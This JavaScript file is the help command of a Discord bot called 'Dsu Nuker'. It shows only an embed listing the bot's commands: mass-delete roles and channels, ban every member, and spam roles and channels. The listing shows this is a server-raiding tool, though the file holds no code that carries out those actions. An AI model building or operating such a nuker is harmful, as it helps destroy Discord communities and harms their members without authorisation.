const commando = require('discord.js-commando');
const Discord = require('discord.js');
class helpCommand extends commando.Command {
    constructor(client) {
        super(client,
            {
                name: 'help',
                group: 'funkcje',
                memberName: 'help',
                description: 'Beke mam z ciebie'
            })
    }
    async run(message, args) {
        let embed = new Discord.RichEmbed()
            .setTitle('**Dsu Nuker:)**')
            .addField("`.nuke`", "Delete all roles and channel and ban all server members.")
            .addField("`.spamroles [Name]`", "Create Mass Roles.")
            .addField("`.spamch [Name]`", "Create Mass Channels.")
            .addField("`.banall`", "Ban All Server Members.")
            .addField("`.deleteall`", "Delete all roles and channels.")
            .addField("`.roles`", "Give You role id ")
            .addField("`.roleall [role id]`", "Roles Check")
            .setFooter('Made by: Dsu')
            .setAuthor(message.author.username, message.author.avatarURL)
            .setTimestamp()
            .setColor('RANDOM');
        message.author.send(embed);
        message.delete();
    }
}

module.exports = helpCommand;
